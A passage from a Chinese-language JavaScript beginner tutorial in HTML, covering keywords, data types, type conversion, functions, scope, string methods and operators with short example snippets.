title="关键字"></a>关键字</h2><p>和其他任何编程语言一样，JavaScript 也保留了一些关键字为自己所用。</p><p>​                                                                                     <strong>JavaScript中重要的保留关键字</strong></p><table><thead><tr><th align="center"></th><th align="center"></th><th align="center"></th><th align="center"></th><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">abstract</td><td align="center">debugger</td><td align="center">final</td><td align="center">instanceof</td><td align="center">protected</td><td align="center">throws</td></tr><tr><td align="center">boolean</td><td align="center">default</td><td align="center">finally</td><td align="center">int</td><td align="center">public</td><td align="center">transient</td></tr><tr><td align="center">break</td><td align="center">delete</td><td align="center">float</td><td align="center">interface</td><td align="center">return</td><td align="center">true</td></tr><tr><td align="center">byte</td><td align="center">do</td><td align="center">for</td><td align="center">let</td><td align="center">short</td><td align="center">try</td></tr><tr><td align="center">case</td><td align="center">double</td><td align="center">function</td><td align="center">long</td><td align="center">static</td><td align="center">typeof</td></tr><tr><td align="center">catch</td><td align="center">else</td><td align="center">goto</td><td align="center">native</td><td align="center">super</td><td align="center">var</td></tr><tr><td align="center">char</td><td align="center">enum</td><td align="center">if</td><td align="center">new</td><td align="center">switch</td><td align="center">void</td></tr><tr><td align="center">class</td><td align="center">export</td><td align="center">implements</td><td align="center">null</td><td align="center">synchronized</td><td align="center">volatile</td></tr><tr><td align="center">const</td><td align="center">extends</td><td align="center">import</td><td align="center">package</td><td align="center">this</td><td align="center">while</td></tr><tr><td align="center">continue</td><td align="center">false</td><td align="center">in</td><td align="center">private</td><td align="center">throw</td><td align="center">with</td></tr></tbody></table><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><code>//</code>后的内容是注释</p><p><code>//这是注释</code></p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>值类型(基本类型)：字符串（String）、数字(Number)、布尔(Boolean)、对空（Null）、未定义（Undefined）、Symbol。</p><p>引用数据类型：对象(Object)、数组(Array)、函数(Function)。</p><p>在 JavaScript 中有 6 种不同的数据类型string、number、boolean、object、function、symbol，3 种对象类型Object、Date、Array，2 个不包含任何值的数据类型null、undefined</p><p>JavaScript 拥有<strong>动态类型</strong>。这意味着相同的变量可用作不同的类型。</p><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x;             <span class="comment">//x为undefined</span></span><br><span class="line"><span class="keyword">var</span> x=<span class="number">5</span>;           <span class="comment">//现在x为数字</span></span><br><span class="line"><span class="keyword">var</span> x=<span class="string">&quot;John&quot;</span>;      <span class="comment">//现在x为字符串</span></span><br></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>字符串是存储字符的变量，如“bilibili”</p><p>字符串可以是引号（” “或‘ ’）中的任意文本。</p><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> example=<span class="string">&quot;Bilibili&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> example=<span class="string">&quot;this is an &#x27;example&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> example=<span class="string">&#x27;this is another &quot;example&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><p>JavaScript 只有一种数字类型。数字可以带小数点，也可以不带</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x1=<span class="number">34.00</span>;      <span class="comment">//使用小数点</span></span><br><span class="line"><span class="keyword">var</span> x2=<span class="number">34</span>;         <span class="comment">//不使用小数点</span></span><br></pre></td></tr></table></figure><p>较大或较小的数字可以通过科学（指数）计数法来书写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y=<span class="number">123e5</span>;      <span class="comment">// 12300000</span></span><br><span class="line"><span class="keyword">var</span> z=<span class="number">123e-5</span>;     <span class="comment">// 0.00123</span></span><br></pre></td></tr></table></figure><h3 id="布尔"><a href="#布尔" class="headerlink" title="布尔"></a>布尔</h3><p>布尔（逻辑）只能有两个值：true 或 false。布尔常用于条件测试。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> b=<span class="literal">false</span>;</span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组下标从0开始</p><p>创建数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">①</span><br><span class="line"><span class="keyword">var</span> cars=<span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">cars[<span class="number">0</span>]=<span class="string">&quot;Saab&quot;</span>;</span><br><span class="line">cars[<span class="number">1</span>]=<span class="string">&quot;Volvo&quot;</span>;</span><br><span class="line">cars[<span class="number">2</span>]=<span class="string">&quot;BMW&quot;</span>;</span><br><span class="line"></span><br><span class="line">②</span><br><span class="line"><span class="keyword">var</span> cars=[<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>];</span><br><span class="line"></span><br><span class="line">③</span><br><span class="line"><span class="keyword">var</span> cars=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="未定义和对空"><a href="#未定义和对空" class="headerlink" title="未定义和对空"></a>未定义和对空</h3><p>未定义（undefined）表示变量不含有值。可以通过将变量的值设置为 null 来清空变量</p><p>例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">doge=<span class="literal">null</span>;</span><br><span class="line">dragon=<span class="literal">null</span>;</span><br></pre></td></tr></table></figure><h3 id="typeof，null和undefined"><a href="#typeof，null和undefined" class="headerlink" title="typeof，null和undefined"></a>typeof，null和undefined</h3><h4 id="typeof操作符"><a href="#typeof操作符" class="headerlink" title="typeof操作符"></a>typeof操作符</h4><p>typeof操作符可以用来检测变量的数据类型。typeof 一个没有值的变量会返回 undefined。</p><p>例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="string">&quot;John&quot;</span>                <span class="comment">// 返回 string</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="number">3.14</span>                  <span class="comment">// 返回 number</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">false</span>                 <span class="comment">// 返回 boolean</span></span><br><span class="line"><span class="keyword">typeof</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]             <span class="comment">// 返回 object</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;<span class="attr">name</span>:<span class="string">&#x27;John&#x27;</span>, <span class="attr">age</span>:<span class="number">34</span>&#125; <span class="comment">// 返回 object</span></span><br></pre></td></tr></table></figure><p>PS：在JavaScript中，数组是一种特殊的对象类型。 因此 typeof [1,2,3,4] 返回 object。 </p><h4 id="null"><a href="#null" class="headerlink" title="null"></a>null</h4><p>在 JavaScript 中 null 表示 “什么都没有”。null是一个只有一个值的特殊类型。表示一个空对象引用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> learn=<span class="literal">null</span>;           <span class="comment">// 值为 null(空), 但类型为对象</span></span><br></pre></td></tr></table></figure><h4 id="undefined"><a href="#undefined" class="headerlink" title="undefined"></a>undefined</h4><p>在 JavaScript 中, undefined 是一个没有设置值的变量。任何变量都可以通过设置值为 undefined 来清空，类型为 undefined</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person=<span class="literal">undefined</span>;          <span class="comment">// 值为 undefined, 类型是undefined</span></span><br></pre></td></tr></table></figure><h4 id="undefined-和-null-的区别"><a href="#undefined-和-null-的区别" class="headerlink" title="undefined 和 null 的区别"></a>undefined 和 null 的区别</h4><p>null 和 undefined 值相等，类型不同</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>             <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>                  <span class="comment">// object</span></span><br><span class="line"><span class="literal">null</span> === <span class="literal">undefined</span>           <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">undefined</span>            <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>JavaScript变量可以通过使用<strong>JavaScript函数</strong> 或 <strong>JavaScript自身自动转换</strong> 转换为 新变量或其他数据类型。</p><h4 id="数字转换为字符串"><a href="#数字转换为字符串" class="headerlink" title="数字转换为字符串"></a>数字转换为字符串</h4><p>全局方法<code>String()</code>可以将数字转换为字符串。该方法可用于任何类型的数字，字母，变量，表达式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>(x)         <span class="comment">// 将变量 x 转换为字符串并返回</span></span><br><span class="line"><span class="built_in">String</span>(<span class="number">123</span>)       <span class="comment">// 将数字 123 转换为字符串并返回</span></span><br><span class="line"><span class="built_in">String</span>(<span class="number">100</span> + <span class="number">23</span>)  <span class="comment">// 将数字表达式转换为字符串并返回</span></span><br></pre></td></tr></table></figure><p>Number 方法<code>toString()</code>也可以将数字转换为字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x.toString()</span><br><span class="line">(<span class="number">123</span>).toString()</span><br><span class="line">(<span class="number">100</span> + <span class="number">23</span>).toString()</span><br></pre></td></tr></table></figure><h4 id="布尔值转换为字符串"><a href="#布尔值转换为字符串" class="headerlink" title="布尔值转换为字符串"></a>布尔值转换为字符串</h4><p>全局方法<code>String()</code>可以将布尔值转换为字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>(<span class="literal">false</span>)        <span class="comment">// 返回 &quot;false&quot;</span></span><br><span class="line"><span class="built_in">String</span>(<span class="literal">true</span>)         <span class="comment">// 返回 &quot;true&quot;</span></span><br></pre></td></tr></table></figure><p>Boolean 方法<code>toString()</code>也可以将布尔值转换为字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">false</span>.toString()     <span class="comment">// 返回 &quot;false&quot;</span></span><br><span class="line"><span class="literal">true</span>.toString()      <span class="comment">// 返回 &quot;true&quot;</span></span><br></pre></td></tr></table></figure><h4 id="布尔值转换为数字"><a href="#布尔值转换为数字" class="headerlink" title="布尔值转换为数字"></a>布尔值转换为数字</h4><p>全局方法<code>Number()</code>可将布尔值转换为数字</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>(<span class="literal">false</span>)     <span class="comment">// 返回 0</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">true</span>)      <span class="comment">// 返回 1</span></span><br></pre></td></tr></table></figure><h4 id="日期转换为字符串"><a href="#日期转换为字符串" class="headerlink" title="日期转换为字符串"></a>日期转换为字符串</h4><p>可以使用<code>Date()</code>返回字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Date</span>()      <span class="comment">//返回 Fri Jan 28 2022 16:36:28 GMT+0800 (中国标准时间) </span></span><br></pre></td></tr></table></figure><p>全局方法<code>String()</code>将日期对象转换为字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>(<span class="keyword">new</span> <span class="built_in">Date</span>())     <span class="comment">//返回 Fri Jan 28 2022 16:36:28 GMT+0800 (中国标准时间) </span></span><br></pre></td></tr></table></figure><p>Date 方法<code>toString()</code>将日期对象转换为字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">obj.toString()       <span class="comment">//返回 Fri Jan 28 2022 16:36:28 GMT+0800 (中国标准时间)</span></span><br></pre></td></tr></table></figure><h4 id="日期转换为数字"><a href="#日期转换为数字" class="headerlink" title="日期转换为数字"></a>日期转换为数字</h4><p>全局方法<code>Number()</code>可将日期转换为数字</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d=<span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="built_in">Number</span>(d)          <span class="comment">// 返回 1404568027739</span></span><br></pre></td></tr></table></figure><p>日期方法<code>getTime()</code>也可将日期转换为数字</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d=<span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">d.getTime()        <span class="comment">// 返回 1404568027739</span></span><br></pre></td></tr></table></figure><h4 id="字符串转换为数字"><a href="#字符串转换为数字" class="headerlink" title="字符串转换为数字"></a>字符串转换为数字</h4><p>全局方法<code>Number()</code>可以将字符串转换为数字。字符串包含数字(如 “3.14”) 转换为数字 (如 3.14)。</p><p>空字符串转换为 0，其他的字符串会转换为 NaN (NaN不是数字)。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>(<span class="string">&quot;3.14&quot;</span>)    <span class="comment">// 返回 3.14</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&quot; &quot;</span>)       <span class="comment">// 返回 0</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&quot;&quot;</span>)        <span class="comment">// 返回 0</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&quot;99 88&quot;</span>)   <span class="comment">// 返回 NaN</span></span><br></pre></td></tr></table></figure><h4 id="转换表"><a href="#转换表" class="headerlink" title="转换表"></a>转换表</h4><table><thead><tr><th align="center">原始值</th><th align="center">转换为数字</th><th align="center">转换为字符串</th><th align="center">转换为布尔值</th></tr></thead><tbody><tr><td align="center">false</td><td align="center">0</td><td align="center">“false”</td><td align="center">false</td></tr><tr><td align="center">true</td><td align="center">1</td><td align="center">“true”</td><td align="center">true</td></tr><tr><td align="center">0</td><td align="center">0</td><td align="center">“0”</td><td align="center">false</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">“1”</td><td align="center">true</td></tr><tr><td align="center">“0”</td><td align="center">0</td><td align="center">“0”</td><td align="center">true</td></tr><tr><td align="center">“000”</td><td align="center">0</td><td align="center">“000”</td><td align="center">true</td></tr><tr><td align="center">“1”</td><td align="center">1</td><td align="center">“1”</td><td align="center">true</td></tr><tr><td align="center">NaN</td><td align="center">NaN</td><td align="center">“NaN”</td><td align="center">false</td></tr><tr><td align="center">Infinity</td><td align="center">Infinity</td><td align="center">“Infinity”</td><td align="center">true</td></tr><tr><td align="center">-Infinity</td><td align="center">-Infinity</td><td align="center">“-Infinity”</td><td align="center">true</td></tr><tr><td align="center">“”</td><td align="center">0</td><td align="center">“”</td><td align="center">false</td></tr><tr><td align="center">“20”</td><td align="center">20</td><td align="center">“20”</td><td align="center">true</td></tr><tr><td align="center">“Bilibili”</td><td align="center">NaN</td><td align="center">“Bilibili”</td><td align="center">true</td></tr><tr><td align="center">[ ]</td><td align="center">0</td><td align="center">“”</td><td align="center">true</td></tr><tr><td align="center">[20]</td><td align="center">20</td><td align="center">“20”</td><td align="center">true</td></tr><tr><td align="center">[10,20]</td><td align="center">NaN</td><td align="center">“10,20”</td><td align="center">true</td></tr><tr><td align="center">[“Bilibili”]</td><td align="center">NaN</td><td align="center">“Bilibili”</td><td align="center">true</td></tr><tr><td align="center">[“Bilibili”,”Google”]</td><td align="center">NaN</td><td align="center">“Bilibili,Google”</td><td align="center">true</td></tr><tr><td align="center">function(){}</td><td align="center">NaN</td><td align="center">“function(){}”</td><td align="center">true</td></tr><tr><td align="center">{ }</td><td align="center">NaN</td><td align="center">“[object Object]”</td><td align="center">true</td></tr><tr><td align="center">null</td><td align="center">0</td><td align="center">“null”</td><td align="center">false</td></tr><tr><td align="center">undefined</td><td align="center">NaN</td><td align="center">“undefined”</td><td align="center">false</td></tr></tbody></table><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数是由事件驱动的或者当它被调用时执行的可重复使用的代码块。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functionname</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS：JavaScript 对大小写敏感。关键词 function 必须是小写的，并且必须以与函数名称相同的大小写来调用函数。</p><h3 id="调用带参数的函数"><a href="#调用带参数的函数" class="headerlink" title="调用带参数的函数"></a>调用带参数的函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params">var1,var2</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS：变量和参数必须以一致的顺序出现。第一个变量就是第一个被传递的参数的给定的值，以此类推。</p><h3 id="带返回值的函数"><a href="#带返回值的函数" class="headerlink" title="带返回值的函数"></a>带返回值的函数</h3><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x=<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS：</p><p>在使用 return 语句时，函数会停止执行，并返回指定的值。整个 JavaScript 并不会停止执行，仅仅是函数。JavaScript 将继续执行代码，从调用函数的地方</p><p>如果想直接退出函数，可使用不带有返回值的return语句</p><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params">a,b</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a&gt;b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    x=a+b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字母大小写"><a href="#字母大小写" class="headerlink" title="字母大小写"></a>字母大小写</h2><p>JavaScript 对<strong>大小写</strong>敏感。</p><p>例</p><p>函数<code>getElementById</code>与<code>getElementbyID</code>是不同的。</p><p>变量<code>myVariable</code>与<code>MyVariable</code>也是不同的。</p><h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p>JavaScript 使用<code>Unicode</code>字符集。Unicode 覆盖了所有的字符，包含标点等字符。</p><h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p>在 JavaScript 中, 作用域为可访问变量，对象，函数的集合。</p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>局部变量在函数内声明，作用于局部作用域。局部变量只能在函数内部访问。</p><p>因为局部变量只作用于函数内，所以不同的函数可以使用相同名称的变量。</p><p>局部变量在函数开始执行时创建，函数执行完后局部变量会自动销毁。</p><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>变量在函数外定义，即为全局变量。全局变量有<strong>全局作用域</strong>: 网页中所有脚本和函数均可使用。 </p><p>如果变量在函数内没有声明（没有使用 var 关键字），该变量为全局变量</p><p>例：carName 在函数内，但是为全局变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此处可调用 carName 变量</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    carName = <span class="string">&quot;Volvo&quot;</span>;</span><br><span class="line">    <span class="comment">// 此处可调用 carName 变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JavaScript-变量生命周期"><a href="#JavaScript-变量生命周期" class="headerlink" title="JavaScript 变量生命周期"></a>JavaScript 变量生命周期</h2><p>JavaScript 变量生命周期在它声明时初始化。局部变量在函数执行完毕后销毁，全局变量在页面关闭后销毁。</p><h1 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串"></a>字符串</h1><p>JavaScript 字符串用于存储和处理文本</p><p>可以使用索引位置来访问字符串中的每个字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> carname = <span class="string">&quot;bilibili&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> character = carname[<span class="number">4</span>];</span><br></pre></td></tr></table></figure><h2 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h2><p><code>length</code>属性可以计算字符串的长度</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> example=<span class="string">&quot;qwerasdsadsdzdsadasczxczxcz&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> l=example.length;</span><br></pre></td></tr></table></figure><h2 id="字符串属性"><a href="#字符串属性" class="headerlink" title="字符串属性"></a>字符串属性</h2><table><thead><tr><th align="left">属性</th><th>作用</th></tr></thead><tbody><tr><td align="left">constructor</td><td>返回创建字符串属性的函数</td></tr><tr><td align="left">length</td><td>返回字符串的长度</td></tr><tr><td align="left">prototype</td><td>允许向对象添加属性和方法</td></tr></tbody></table><h2 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h2><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>charAt()</td><td>返回指定索引位置的字符</td></tr><tr><td>charCodeAt()</td><td>返回指定索引位置字符的 Unicode 值</td></tr><tr><td>concat()</td><td>连接两个或多个字符串，返回连接后的字符串</td></tr><tr><td>fromCharCode()</td><td>将 Unicode 转换为字符串</td></tr><tr><td>indexOf()</td><td>返回字符串中检索指定字符第一次出现的位置</td></tr><tr><td>lastIndexOf()</td><td>返回字符串中检索指定字符最后一次出现的位置</td></tr><tr><td>localeCompare()</td><td>用本地特定的顺序来比较两个字符串</td></tr><tr><td>match()</td><td>找到一个或多个正则表达式的匹配</td></tr><tr><td>replace()</td><td>替换与正则表达式匹配的子串</td></tr><tr><td>search()</td><td>检索与正则表达式相匹配的值</td></tr><tr><td>slice()</td><td>提取字符串的片断，并在新的字符串中返回被提取的部分</td></tr><tr><td>split()</td><td>把字符串分割为子字符串数组</td></tr><tr><td>substr()</td><td>从起始索引号提取字符串中指定数目的字符</td></tr><tr><td>substring()</td><td>提取字符串中两个指定的索引号之间的字符</td></tr><tr><td>toLocaleLowerCase()</td><td>根据主机的语言环境把字符串转换为小写，只有几种语言（如土耳其语）具有地方特有的大小写映射</td></tr><tr><td>toLocaleUpperCase()</td><td>根据主机的语言环境把字符串转换为大写，只有几种语言（如土耳其语）具有地方特有的大小写映射</td></tr><tr><td>toLowerCase()</td><td>把字符串转换为小写</td></tr><tr><td>toString()</td><td>返回字符串对象值</td></tr><tr><td>toUpperCase()</td><td>把字符串转换为大写</td></tr><tr><td>trim()</td><td>移除字符串首尾空白</td></tr><tr><td>valueOf()</td><td>返回某个字符串对象的原始值</td></tr></tbody></table><h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>​                                                    字符串中可以使用转义字符转义的特殊字符</p><table><thead><tr><th>字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\&#39;</code></td><td>&#39;</td></tr><tr><td><code>\&quot;</code></td><td>&quot;</td></tr><tr><td><code>\\</code></td><td>\</td></tr><tr><td>\n</td><td>换行</td></tr><tr><td>\r</td><td>回车</td></tr><tr><td>\t</td><td>tab(制表符)</td></tr><tr><td>\b</td><td>退格符</td></tr><tr><td>\f</td><td>换页符</td></tr></tbody></table><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><table><thead><tr><th align="center">算数运算符</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">加法</td></tr><tr><td align="center">-</td><td align="center">减法</td></tr><tr><td align="center">*</td><td align="center">乘法</td></tr><tr><td align="center">/</td><td align="center">除法</td></tr><tr><td align="center">%</td><td align="center">取模（求余）</td></tr><tr><td align="center">++</td><td align="center">自增</td></tr><tr><td align="center">–</td><td align="center">自减</td></tr></tbody></table><h3 id="运算符-1"><a href="#运算符-1" class="headerlink" title="+运算符"></a>+运算符</h3><p>①+运算符可以把文本值或字符串连接起来。</p><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">txt1=<span class="string">&quot;What a very &quot;</span>;</span><br><span class="line">txt2=<span class="string">&quot;nice day&quot;</span>;</span><br><span class="line">txt3=txt1+txt2;</span><br></pre></td></tr></table></figure><p>txt3的值为What a very nice day</p><p>②+运算符还可以把数字与字符串相加，返回字符串</p><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="number">5</span>+<span class="number">5</span>;</span><br><span class="line">y=<span class="string">&quot;5&quot;</span>+<span class="number">5</span>;</span><br><span class="line">z=<span class="string">&quot;Hello&quot;</span>+<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">55</span></span><br><span class="line">Hello5</span><br></pre></td></tr></table></figure><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><table><thead><tr><th align="center">赋值运算符</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">=</td><td align="center">x=y</td></tr><tr><td align="center">+=</td><td align="center">x+=y</td></tr><tr><td align="center">-=</td><td align="center">x-=y</td></tr><tr><td align="center">*=</td><td align="center">x*=y</td></tr><tr><td align="center">/=</td><td align="center">x/=y</td></tr><tr><td align="center">%=</td><td align="center">x%=y</td></tr></tbody></table><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" 